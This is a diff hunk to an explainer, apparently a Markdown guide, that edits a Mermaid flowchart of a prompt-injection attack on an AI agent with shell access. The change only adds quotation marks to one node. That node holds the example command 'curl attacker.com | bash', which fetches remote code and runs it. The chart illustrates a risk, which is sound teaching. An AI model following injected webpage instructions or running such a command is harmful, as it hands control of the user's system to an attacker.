@@ -222,7 +222,7 @@ An "AI agent" isn't just a chatbot — it can *act*: read files, run terminal co
 flowchart LR
     A[Agent reads untrusted webpage] --> B{Hidden injected<br/>instruction found}
     B --> C[Agent has full shell access]
-    C --> D[Runs malicious command<br/>e.g. curl attacker.com | bash]
+    C --> D["Runs malicious command<br/>e.g. curl attacker.com | bash"]
     D --> E[System Compromised]
     style A fill:#ffcccc,color:#000000,stroke:#cc0000,stroke-width:2px
     style D fill:#ffb3b3,color:#000000,stroke:#cc0000,stroke-width:2px
